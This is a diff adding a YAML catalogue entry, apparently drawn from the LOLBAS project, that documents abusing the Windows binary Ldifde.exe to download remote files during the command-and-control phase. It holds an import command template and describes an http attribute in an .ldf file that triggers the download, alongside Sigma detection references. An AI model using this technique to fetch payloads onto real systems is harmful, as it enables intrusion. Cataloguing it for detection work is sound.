@@ -1,0 +1,32 @@
+id: lolbas/ldifde/download/0
+type: binary
+platform: windows
+name: Ldifde.exe
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: admin
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0 (verify upstream LICENSE)
+  upstream_version: 9c5e384
+  last_synced: '2026-08-25'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules/windows/process_creation/proc_creation_win_ldifde_export.yml
+  - https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules/windows/process_creation/proc_creation_win_ldifde_file_load.yml
+  - https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules-emerging-threats/2019/TA/APT31/proc_creation_win_apt_apt31_judgement_panda.yml
+commands:
+- template: Ldifde -i -f {PATH:.ldf}
+  comment: Import specified .ldf file into LDAP. If the file contains http-based attrval-spec such as
+    `thumbnailPhoto:< http://example.org/somefile.txt`, the file will be downloaded into IE temp folder.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Ldifde/
+tags:
+- windows
+- lolbas
